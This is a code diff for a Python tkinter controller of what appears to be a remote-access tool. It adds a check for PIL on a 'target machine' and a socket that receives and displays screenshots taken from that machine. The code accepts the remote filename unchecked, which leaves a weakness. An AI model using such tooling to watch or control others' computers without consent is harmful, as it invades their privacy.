@@ -12,7 +12,8 @@ class remote_connection:
         self.socket_server.listen(1)
         connection, address = self.socket_server.accept()
         self.server = connection
-        self.handshake(["connected"])
+        self.pilactive = self.handshake(["connected"])[1]
+        print(self.pilactive)
     def handshake(self,buffer):
         self.server.sendall(b"_")
         self.server.recv(1024)
@@ -31,6 +32,28 @@ class remote_connection:
             self.server.sendall(b"_")
             receive_buffer.append(recv.decode())
         return receive_buffer
+    def file_transfer_socket(self):#temporary
+        temp_socket_server = socket.socket()
+        temp_socket_server.bind(("192.168.1.141",8018))
+        temp_socket_server.listen(1)
+        connection, address = temp_socket_server.accept()
+        temp_server = connection
+        filename = temp_server.recv(1024).decode()
+        temp_server.sendall(b"_")
+        with open(filename,"wb") as doc:
+            while True:
+                content = temp_server.recv(4096)
+                if content == b"&end":
+                    break
+                doc.write(content)
+                temp_server.sendall(b"_")
+            doc.close()
+        print("done copying file over")
+        root = tkinter.Tk()
+        image = tkinter.PhotoImage(master=root,file="remote screenshot.png")
+        displaylabel = tkinter.Label(root,image=image)
+        displaylabel.pack()
+        root.mainloop()
 class window(remote_connection):
     def __init__(self) -> None:
         super().__init__()
@@ -71,11 +94,15 @@ class window(remote_connection):
                                               fg="green",bg="black",text="get ip",
                                               command=lambda:self.quick_action(action="ip address"))
         self.ip_button.grid(row=0,column=1,columnspan=1,sticky=tkinter.NSEW)
-        self.screen_capture_button = tkinter.Button(self.quick_actions_frame,
-                                              fg="green",bg="black",text="screen capture",
-                                              command=lambda:self.quick_action(action="screen capture"))
-        self.screen_capture_button.grid(row=1,column=0,columnspan=1,sticky=tkinter.NSEW)
         
+        if self.pilactive == "True":
+            print("PIL detected on target machine, unlocking screen captures")
+            self.screen_capture_button = tkinter.Button(self.quick_actions_frame,
+                                                fg="green",bg="black",text="screen capture",
+                                                command=lambda:self.quick_action(action="screen capture"))
+            self.screen_capture_button.grid(row=1,column=0,columnspan=1,sticky=tkinter.NSEW)
+        else:
+            print("pil not detected, some features may not work")
         #upkeep of the program
         threading.Thread(target=self.mainloop).start()
         self.root.mainloop()
@@ -99,6 +126,7 @@ class window(remote_connection):
                 self.outgoing_buffer.append("ip address")
             case "screen capture":
                 self.outgoing_buffer.append("screen capture")
+                threading.Thread(target=self.file_transfer_socket).start()
     def submit_command(self):
         command = self.submit_command_entry.get()
         if command == "":
